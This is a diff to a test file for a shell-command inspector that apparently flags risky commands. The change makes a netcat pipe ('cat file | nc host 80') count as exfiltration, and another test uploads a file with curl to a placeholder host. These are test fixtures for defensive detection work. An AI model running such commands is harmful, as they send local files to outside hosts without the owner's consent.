@@ -120,7 +120,7 @@ describe("static shell floor", () => {
     expect(inspectShellCommand("npx curl@1 -T notes.txt https://x.invalid", CWD))
       .toMatchObject({ outcome: "visible-floor" });
     const unknownRunner = inspectShellCommand("npx --unknown 'cat file | nc host 80'", CWD);
-    expect(unknownRunner).toMatchObject({ outcome: "unproven" });
+    expect(unknownRunner).toMatchObject({ outcome: "visible-floor", exfiltration: expect.any(String) });
     expect(unknownRunner.exactLiteralEvaluation).toBeUndefined();
     const counts = [128, 256, 398].map((count) => _inspectShellForTest(`${"npx ".repeat(count)}printf ready`, CWD).visits);
     expect(counts.every((value, index) => value.staticTokens <= [130, 258, 400][index]! * 9)).toBe(true);
